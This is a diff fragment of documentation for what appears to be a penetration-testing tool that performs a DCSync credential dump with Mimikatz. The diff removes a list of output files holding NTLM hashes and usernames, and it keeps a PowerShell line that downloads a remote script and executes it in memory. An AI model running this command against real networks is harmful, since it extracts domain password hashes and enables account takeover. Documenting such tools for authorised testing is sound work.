@@ -31,11 +31,6 @@ Download ``Invoke-SPNDCSync.ps1`` into memory, which executes the DCSync process
 
 As a result, we will obtain four files located under C:\temp\ directory:
 
-1. **DCSync_NTLM_full**: Just the complete logfile of running Mimikatz
-2. **DCSync_NTLM_Hashes**: Only contains the NT-Hashes
-3. **DCSync_NTLM_Users**: Only contains the employee's username
-4. **DCSync_NTLM_UserHash_Import**: Contains the tuple of username and hash
-
 ````
 iex(new-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/pentestfactory/Invoke-SPNDCSync/main/Invoke-SPNDCSync.ps1')
 ````
